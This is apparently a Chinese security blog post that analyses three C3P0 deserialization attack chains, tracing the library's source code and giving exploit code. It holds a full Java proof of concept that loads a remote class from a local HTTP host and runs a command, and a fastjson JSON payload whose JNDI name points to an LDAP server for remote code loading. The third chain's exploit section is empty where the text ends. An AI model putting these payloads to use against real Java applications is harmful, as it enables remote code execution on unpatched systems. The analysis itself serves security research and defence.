# 前言
C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。目前使用它的开源项目有Hibernate，Spring等。
JDBC是Java DataBase Connectivity的缩写，它是Java程序访问数据库的标准接口。  
使用Java程序访问数据库时，Java代码并不是直接通过TCP连接去访问数据库，而是通过JDBC接口来访问，而JDBC接口则通过JDBC驱动来实现真正对数据库的访问。
连接池类似于线程池，在一些情况下我们会频繁地操作数据库，此时Java在连接数据库时会频繁地创建或销毁句柄，增大资源的消耗。为了避免这样一种情况，我们可以提前创建好一些连接句柄，需要使用时直接使用句柄，不需要时可将其放回连接池中，准备下一次的使用。类似这样一种能够复用句柄的技术就是池技术。
# 环境搭建
        com.mchange
        c3p0
        0.9.5.2
# 关于C3P0攻击链的利用方式
1、URLClassLoader远程类加载  
2、JNDI注入  
3、利用HEX序列化字节加载器进行反序列化攻击
## URLClassLoader
漏洞点在`PoolBackedDataSourceBase`
`readobject`
    private void readObject( ObjectInputStream ois ) throws IOException, ClassNotFoundException
        {
            short version = ois.readShort();
            switch (version)
            {
                case VERSION:
                    // we create an artificial scope so that we can use the name o for all indirectly serialized objects.
                    {
                        Object o = ois.readObject();
                        if (o instanceof IndirectlySerialized) o = ((IndirectlySerialized) o).getObject();
                        this.connectionPoolDataSource = (ConnectionPoolDataSource) o;
                    }
                    this.dataSourceName = (String) ois.readObject();
                    // we create an artificial scope so that we can use the name o for all indirectly serialized objects.
                    {
                        Object o = ois.readObject();
                        if (o instanceof IndirectlySerialized) o = ((IndirectlySerialized) o).getObject();
                        this.extensions = (Map) o;
                    }
                    this.factoryClassLocation = (String) ois.readObject();
                    this.identityToken = (String) ois.readObject();
                    this.numHelperThreads = ois.readInt();
                    this.pcs = new PropertyChangeSupport( this );
                    this.vcs = new VetoableChangeSupport( this );
                    break;
                default:
                    throw new IOException("Unsupported Serialized Version: " + version);
            }
        }
注意到
这里会先判断对象o是否是`IndirectlySerialized`类的对象或者是其子类的对象  
调用`getobject`后强转换对象为`ConnectionPoolDataSource`  
但是该接口并不能反序列化
去看下入口点`writeobject`处的写法  
`writeobject`
看下调用返回的对象
是一个`ReferenceSerialized`的构造方法
举个不是很恰当的例子  
`ReferenceSerialized`是“加强版”的`ConnectionPoolDataSource`
也就是说在序列化时，实际上的类进行了转换，`ConnectionPoolDataSource`->`ReferenceSerialized`
再回到`readobject`调用的`IndirectlySerialized.getobject`  
位于`ReferenceIndirector`  
`getObject`
    public Object getObject() throws ClassNotFoundException, IOException
        {
            try
            {
                Context initialContext;
                if ( env == null )
                initialContext = new InitialContext();
                else
                initialContext = new InitialContext( env );
                Context nameContext = null;
                if ( contextName != null )
                nameContext = (Context) initialContext.lookup( contextName );
                return ReferenceableUtils.referenceToObject( reference, name, nameContext, env ); 
            }
            catch (NamingException e)
            {
                //e.printStackTrace();
                if ( logger.isLoggable( MLevel.WARNING ) )
                logger.log( MLevel.WARNING, "Failed to acquire the Context necessary to lookup an Object.", e );
                throw new InvalidObjectException( "Failed to acquire the Context necessary to lookup an Object: " + e.toString() );
            }
        }
这里是对环境变量上下文进行加载  
我们关注return这里`ReferenceableUtils.referenceToObject`，跟进
    public static Object referenceToObject( Reference ref, Name name, Context nameCtx, Hashtable env)
        throws NamingException
        {
        try
            {
            String fClassName = ref.getFactoryClassName();
            String fClassLocation = ref.getFactoryClassLocation();
            ClassLoader defaultClassLoader = Thread.currentThread().getContextClassLoader();
            if ( defaultClassLoader == null ) defaultClassLoader = ReferenceableUtils.class.getClassLoader();
            ClassLoader cl;
            if ( fClassLocation == null )
                cl = defaultClassLoader;
            else
                {
                URL u = new URL( fClassLocation );
                cl = new URLClassLoader( new URL[] { u }, defaultClassLoader );
                }
            Class fClass = Class.forName( fClassName, true, cl );
            ObjectFactory of = (ObjectFactory) fClass.newInstance();
            return of.getObjectInstance( ref, name, nameCtx, env );
            }
        catch ( Exception e )
            {
            if (Debug.DEBUG) 
                {
                //e.printStackTrace();
                if ( logger.isLoggable( MLevel.FINE ) )
                    logger.log( MLevel.FINE, "Could not resolve Reference to Object!", e);
                }
            NamingException ne = new NamingException("Could not resolve Reference to Object!");
            ne.setRootCause( e );
            throw ne;
            }
        }
我们可以控制`fClassLocation`，最后通过`URLClassLoader`并初始化该实例来实现恶意代码执行
### Gadget
    PoolBackedDataSourceBase#readObject->
    ReferenceIndirector#getObject->
    ReferenceableUtils#referenceToObject->
    of(ObjectFactory)#getObjectInstance
### EXP
这里有个`getReference`方法，直接返回一个`Reference`对象
我们可以通过该方法直接构造对象
这里我们获取`ConnectionPoolDataSource`类的私有属性，因为反序列化的是该类对象
    PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);
            Field connectionPoolDataSourceField = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
            connectionPoolDataSourceField.setAccessible(true);
按照`getReference`方法再重写一个方法
    public class C3P01 {
        public static class C3P0 implements ConnectionPoolDataSource, Referenceable{
            @Override
            public Reference getReference() throws NamingException {
                return new Reference("Calc","Calc","http://127.0.0.1:8002/");
            }
            @Override
            public PooledConnection getPooledConnection() throws SQLException {
                return null;
            }
            @Override
            public PooledConnection getPooledConnection(String user, String password) throws SQLException {
                return null;
            }
            @Override
            public PrintWriter getLogWriter() throws SQLException {
                return null;
            }
            @Override
            public void setLogWriter(PrintWriter out) throws SQLException {
            }
            @Override
            public void setLoginTimeout(int seconds) throws SQLException {
            }
            @Override
            public int getLoginTimeout() throws SQLException {
                return 0;
            }
            @Override
            public Logger getParentLogger() throws SQLFeatureNotSupportedException {
                return null;
            }
        }
最后是两个常规方法，序列化和反序列化，但这里我们还需要把构造好的`connectionPoolDataSource`替换成我们本地的Calc  
所以这里再通过
    connectionPoolDataSourceField.set(poolBackedDataSourceBase,lp);  //将对象进行修改
并把它写在序列化入口，然后在反序列化
    import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
    import javax.naming.NamingException;
    import javax.naming.Reference;
    import javax.naming.Referenceable;
    import javax.sql.ConnectionPoolDataSource;
    import javax.sql.PooledConnection;
    import java.io.*;
    import java.lang.reflect.Field;
    import java.sql.SQLException;
    import java.sql.SQLFeatureNotSupportedException;
    import java.util.logging.Logger;
    public class C3P01 {
        public static class C3P0 implements ConnectionPoolDataSource, Referenceable{
            @Override
            public Reference getReference() throws NamingException {
                return new Reference("Calc","Calc","http://127.0.0.1:8002/");
            }
            @Override
            public PooledConnection getPooledConnection() throws SQLException {
                return null;
            }
            @Override
            public PooledConnection getPooledConnection(String user, String password) throws SQLException {
                return null;
            }
            @Override
            public PrintWriter getLogWriter() throws SQLException {
                return null;
            }
            @Override
            public void setLogWriter(PrintWriter out) throws SQLException {
            }
            @Override
            public void setLoginTimeout(int seconds) throws SQLException {
            }
            @Override
            public int getLoginTimeout() throws SQLException {
                return 0;
            }
            @Override
            public Logger getParentLogger() throws SQLFeatureNotSupportedException {
                return null;
            }
        }
        public static void unserialize(byte[] bytes) throws Exception{
            try(ByteArrayInputStream bain = new ByteArrayInputStream(bytes);
                ObjectInputStream oin = new ObjectInputStream(bain)){
                oin.readObject();
            }
        }
        public static byte[] serialize(ConnectionPoolDataSource lp) throws Exception{
            PoolBackedDataSourceBase poolBackedDataSourceBase = new PoolBackedDataSourceBase(false);
            Field connectionPoolDataSourceField = PoolBackedDataSourceBase.class.getDeclaredField("connectionPoolDataSource");
            connectionPoolDataSourceField.setAccessible(true);
            connectionPoolDataSourceField.set(poolBackedDataSourceBase,lp);
            try(ByteArrayOutputStream baout = new ByteArrayOutputStream();
                ObjectOutputStream oout = new ObjectOutputStream(baout)){
                oout.writeObject(poolBackedDataSourceBase);
                return baout.toByteArray();
            }
        }
        public static void main(String[] args) throws Exception{
            C3P0 exp = new C3P0();
            byte[] bytes = serialize(exp);
            unserialize(bytes);
        }
    }
calc
    import java.io.IOException;
    public class Calc {
        public Calc() throws IOException {
            Runtime.getRuntime().exec("calc");
        }
    }
本白一开始的傻帽操作，把文件放包下了，一直不能弹计算器，郁闷(真傻
## JNDI注入
`JndiRefForwardingDataSource`的`dereference()`方法中有look，并且`jndiName`通过`getJndiName()`获取，可造成JNDI注入
先看下`getJnDIName`
    public Object getJndiName()
        { return (jndiName instanceof Name ? ((Name) jndiName).clone() : jndiName /* String */); }
判断是否是name类型，不是则返回String类型
继续向上找可以利用的点  
`inner()`
找到`setLoginRimeout`,形参为`int`型
下面就是`WrapperConnectionPoolDataSource`和`JndiRefConnectionPoolDataSource`的同名函数  
在`JndiRefConnectionPoolDataSource`，`setLoginTimeout`，因为`wcpds`是`WrapperConnectionPoolDataSource`类下的，所以这里会调用`WrapperConnectionPoolDataSource`下的同名方法
这里会调用`getNestedDataSource()`对象
跟进后发现其实就是`JndiRefForwardingDataSource`
在下一步就知道到这里
后面就会去加载我们传入的`jndiName`
### Gadget
    JndiRefConnectionPoolDataSource#setLoginTime ->
    WrapperConnectionPoolDataSource#setLoginTime ->
    JndiRefForwardingDataSource#setLoginTimeout ->
    JndiRefForwardingDataSource#inner ->
    JndiRefForwardingDataSource#dereference() ->
    Context#lookup
### EXP
    import com.alibaba.fastjson.JSON;
    public class JNDI {
        public static void main(String[] args) {
            String payload = "{\"@type\":\"com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\"," +
                    "\"jndiName\":\"ldap://10.6.42.156:8085/NpgoGBfd\",\"LoginTimeout\":\"1\"}";
            JSON.parse(payload);
        }
    }
## HEX序列化
在`WrapperConnectionPoolDataSource`的构造方法下
调用了`C3P0ImplUtils.parseUserOverridesAsString`
跟进
    public static Map parseUserOverridesAsString( String userOverridesAsString ) throws IOException, ClassNotFoundException
        { 
        if (userOverridesAsString != null)
            {
            String hexAscii = userOverridesAsString.substring(HASM_HEADER.length() + 1, userOverridesAsString.length() - 1);
            byte[] serBytes = ByteUtils.fromHexAscii( hexAscii );
            return Collections.unmodifiableMap( (Map) SerializableUtils.fromByteArray( serBytes ) );
            }
        else
            return Collections.EMPTY_MAP;
        }
当`userOverridesAsString`不为空进入if  
首先会用`substring`对`userOverridesAsString`进行截取，将`HASM_HEADER`头和最后一位的;扣掉  
而`userOverridesAsString`是一个私有的常量
    private final static String HASM_HEADER = "HexAsciiSerializedMap";
将十六进制转成字节数组，最后再强转为`map`对象
跟进`fromByteArray
    public static Object fromByteArray(byte[] bytes) throws IOException, ClassNotFoundException
        { 
        Object out = deserializeFromByteArray( bytes ); 
        if (out instanceof IndirectlySerialized)
            return ((IndirectlySerialized) out).getObject();
        else
            return out;
        }
最后到
    public static Object deserializeFromByteArray(byte[] bytes) throws IOException, ClassNotFoundException
        {
        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bytes));
        return in.readObject();
        }
进行反序列化
### Gadget
    WrapperConnectionPoolDataSource#WrapperConnectionPoolDataSource->
    C3P0ImplUtils#parseUserOverridesAsString->
    SerializableUtils#fromByteArray->
    SerializableUtils#deserializeFromByteArray->
    SerializableUtils
### EXP